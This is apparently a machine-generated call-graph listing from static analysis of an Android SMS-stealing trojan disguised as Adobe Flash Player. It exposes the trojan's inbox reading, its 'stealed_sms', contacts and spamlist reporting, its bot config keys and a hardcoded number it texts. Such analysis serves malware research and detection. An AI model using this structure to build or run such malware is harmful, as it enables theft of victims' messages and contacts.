VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>($r20, $r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r34) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void close()>() in <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.OutputStreamWriter: void close()>
SPECIAL edge: specialinvoke $r60.<java.util.Date: void <init>(long)>($l4) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.util.Date: void <init>(long)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=contacts&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeFlashCore$1: void <init>(com.adobe.flashplayer_.AdobeFlashCore,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.MacrosStat: void <init>()> ==> <android.app.Service: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String toString()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r17 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r11) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=stealed_sms&i=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r3 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r25 = virtualinvoke $r21.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r8) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getProcesses:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashARM dummyMainMethod_com_adobe_flashplayer___FlashARM(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r21, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r29) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r4 = virtualinvoke r4.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("_", " ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $i0 = virtualinvoke r19.<java.lang.String: int indexOf(java.lang.String)>("getProcesses") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: int indexOf(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke r0.<com.adobe.flashplayer_.FlashW: android.content.Intent getIntent()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashW: android.content.Intent getIntent()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r7.<com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>(r0) in <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)> ==> <com.adobe.flashplayer.Certificate$2: void <init>(com.adobe.flashplayer.Certificate)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=out_sms&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.lang.StringBuilder: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]:Executed") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r5.<com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>($r1, "ON") in <com.adobe.flashplayer_.adobeCore: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)>
SPECIAL edge: $r21 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_SMSGate", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke $r16.<com.adobe.flashplayer_.AdobeFlashCore$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "getCalls:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r12 = virtualinvoke $r12.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("We have a little surprise!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: r27 = staticinvoke <android.net.Uri: android.net.Uri parse(java.lang.String)>("content://sms/inbox") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.net.Uri: android.net.Uri parse(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r22) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r9) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r1) in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotLocation") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.MacrosStat$1: void <init>(com.adobe.flashplayer_.MacrosStat,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: virtualinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r24) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: $r8 = specialinvoke r0.<com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotLocation", $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r16.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: virtualinvoke r4.<java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.StringBuffer append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r11 = virtualinvoke $r11.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>("+", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?a=1&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=spamlist&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r11 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>("") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: r25 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r17 = virtualinvoke $r17.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r20 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r7 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotNetwork") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
VIRTUAL edge: virtualinvoke $r1.<com.adobe.flashplayer_.AdobeZCore$1: android.os.CountDownTimer start()>() in <com.adobe.flashplayer_.AdobeZCore: void onCreate()> ==> <android.os.CountDownTimer: android.os.CountDownTimer start()>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
STATIC edge: $r16 = staticinvoke <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>($r15) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <android.telephony.SmsMessage: android.telephony.SmsMessage createFromPdu(byte[])>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: virtualinvoke $r15.<com.adobe.flashplayer_.FlashVars: android.os.AsyncTask execute(java.lang.Object[])>($r16) in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
SPECIAL edge: specialinvoke $r2.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>($r1, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.SystemSWF: void onReceive(android.content.Context,android.content.Intent)> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("BCTMP_") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r24) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
STATIC edge: $r3 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>() in <com.adobe.flashplayer_.AdobeUtil: void sendSMS(java.lang.String,java.lang.String)> ==> <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r5) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("+") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\rDate: ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, r19, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: $r12 = specialinvoke r0.<com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r1) in <com.adobe.flashplayer_.FlashY: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>($r11, $r18, $r1) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void saveData(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>("+79037676840", r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=file&i=cmd") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
SPECIAL edge: specialinvoke $r58.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: r1 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
